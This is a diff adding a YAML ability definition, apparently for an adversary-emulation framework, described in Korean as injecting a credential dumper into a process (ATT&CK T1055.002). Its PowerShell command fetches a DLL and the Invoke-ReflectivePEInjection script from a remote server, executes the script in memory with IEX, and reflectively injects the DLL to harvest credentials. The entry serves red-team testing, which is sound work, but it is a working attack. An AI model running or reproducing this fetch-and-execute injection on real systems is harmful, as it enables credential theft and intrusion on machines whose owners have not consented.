@@ -1,0 +1,21 @@
+---
+
+- id: c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7
+  name: Inject Cred dumper into process (Spookier)
+  description: Inject Cred dumper into process (Spookier)는 자격 증명 덤퍼 실행 파일을 프로세스에 주입하여 자격 증명을 수집하는 공격입니다. 프로세스 주입 방지를 위해 메모리 보호 메커니즘을 사용하고, 비정상적인 프로세스 활동을 모니터링해서 완화할 수 있습니다. 
+  tactic: credential-access
+  technique:
+    attack_id: T1055.002
+    name: "Process Injection: Portable Executable Injection"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="http://10.125.37.96:8000/api/v1/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("file","debugger.dll");
+          $PBytes = $wc.DownloadData($url);
+          $wc1 = New-Object System.net.webclient;
+          $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
+          IEX ($wc1.DownloadString($url));
+          Invoke-ReflectivePEInjection -PBytes $PBytes -verbose
